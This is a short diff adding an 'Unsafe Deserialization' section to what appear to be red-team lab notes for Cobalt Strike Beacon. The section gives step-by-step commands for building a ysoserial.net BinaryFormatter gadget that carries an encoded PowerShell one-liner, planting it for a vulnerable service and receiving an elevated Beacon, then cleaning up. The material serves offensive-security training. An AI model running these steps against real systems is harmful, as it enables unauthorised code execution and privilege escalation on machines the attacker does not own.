@@ -58,3 +58,27 @@
 -  Delete the service payload.
     
     1. rm dns_x64.svc.exe
+
+### Unsafe Deserialization
+
+1.  Host a PowerShell one-liner on the medium-integrity Beacon for a DNS Beacon payload.
+    
+> Right-click the Beacon and select **Access > One-liner**.
+    
+2.  On your Attacker Desktop, generate a serialized gadget with ysoserial.net, using the PowerShell one-liner from the previous step.
+    
+    `C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc ..." -o raw --outputpath=C:\Payloads\data.bin`
+    
+3.  Change Beacon's current working directory.
+    
+    1. cd C:\Temp
+4.  Upload the gadget.
+    
+    1. upload C:\Payloads\data.bin
+5.  Sit back and wait for up to 60 seconds for the elevated Beacon to appear.
+    
+> Check that the service is running with sc_query BadWindowsService and use sc_start BadWindowsService is you need to.
+    
+6.  Delete the gadget.
+    
+    1. rm data.bin
